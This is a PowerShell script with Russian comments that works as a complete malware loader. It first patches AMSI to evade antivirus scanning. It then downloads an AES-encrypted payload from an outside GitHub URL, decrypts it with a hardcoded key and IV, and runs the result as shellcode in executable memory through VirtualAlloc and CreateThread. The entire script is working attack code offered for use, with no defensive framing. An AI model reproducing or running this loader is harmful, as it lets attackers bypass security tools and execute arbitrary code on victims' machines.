# === 1. AMSI Bypass (наиболее надёжный способ через патч Reflection) ===
# Если у вас нет готовой DLL в Base64, можно использовать альтернативу ниже.
# Замените "ВАША_BASE64_AMSIDLL" на реальную строку, либо удалите эту часть
# и используйте простой bypass: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true

try {
    [Reflection.Assembly]::Load([System.Convert]::FromBase64String("ВАША_BASE64_AMSIDLL")) | Out-Null
} catch {
    # Если не сработало, пробуем упрощённый вариант
    [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
}

# === 2. Конфигурация ===
$url = "https://raw.githubusercontent.com/fp228hash/12312s1/refs/heads/main/payload.bin"
$keyB64 = "fVTehay+BdWjG36Y/uVTsSRxcigFTDnLYNmBn3UTlG0="     # из вывода aes_encrypt.py
$ivB64  = "YDmQpIzrqjLut2FFkpCmrA=="       # из вывода aes_encrypt.py

# === 3. Скачиваем зашифрованный payload ===
$wc = New-Object System.Net.WebClient
$encrypted = $wc.DownloadData($url)

# === 4. Преобразуем ключ и IV из Base64 ===
$key = [System.Convert]::FromBase64String($keyB64)
$iv  = [System.Convert]::FromBase64String($ivB64)

# === 5. Расшифровка AES-256-CBC (через .NET) ===
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$decryptor = $aes.CreateDecryptor()
$decrypted = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
$aes.Dispose()

# === 6. WinAPI функции для запуска shellcode в памяти ===
$VirtualAlloc = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
"@ -Name "WinAPI" -Namespace "Kernel32" -PassThru

$RtlMoveMemory = Add-Type -MemberDefinition @"
[DllImport("ntdll.dll")]
public static extern void RtlMoveMemory(IntPtr dest, byte[] src, uint length);
"@ -Name "NtAPI" -Namespace "Ntdll" -PassThru

$CreateThread = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@ -Name "ThreadAPI" -Namespace "Kernel32" -PassThru

$WaitForSingleObject = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
"@ -Name "WaitAPI" -Namespace "Kernel32" -PassThru

# === 7. Выделяем исполняемую память, копируем shellcode, запускаем поток ===
$mem = $VirtualAlloc::VirtualAlloc([IntPtr]::Zero, $decrypted.Length, 0x3000, 0x40)
$RtlMoveMemory::RtlMoveMemory($mem, $decrypted, $decrypted.Length)
$thread = $CreateThread::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$WaitForSingleObject::WaitForSingleObject($thread, 0xFFFFFFFF)